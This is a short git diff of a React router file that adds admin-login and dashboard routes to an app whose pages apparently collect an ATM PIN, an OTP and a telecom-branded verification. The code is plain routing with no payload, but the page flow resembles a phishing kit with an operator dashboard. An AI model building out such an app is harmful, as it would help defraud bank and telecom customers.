@@ -18,6 +18,8 @@ import ATMPin from "./pages/ATMPin";
 import Success from "./pages/Success";
 import OoreedooVerification from "./pages/OoreedooVerification";
 import NotFound from "./pages/NotFound";
+import AdminLogin from "./pages/AdminLogin";
+import Dashboard from "./pages/Dashboard";
 
 const queryClient = new QueryClient();
 
@@ -60,6 +62,8 @@ const AppContent = () => {
       <Route path="/ooredoo-verification" element={<OoreedooVerification />} />
       <Route path="/otp-verification" element={<OTPVerification />} />
       <Route path="/success" element={<Success />} />
+      <Route path="/admin-login" element={<AdminLogin />} />
+      <Route path="/dashboard" element={<Dashboard />} />
       {/* ADD ALL CUSTOM ROUTES ABOVE THE CATCH-ALL "*" ROUTE */}
       <Route path="*" element={<NotFound />} />
     </Routes>
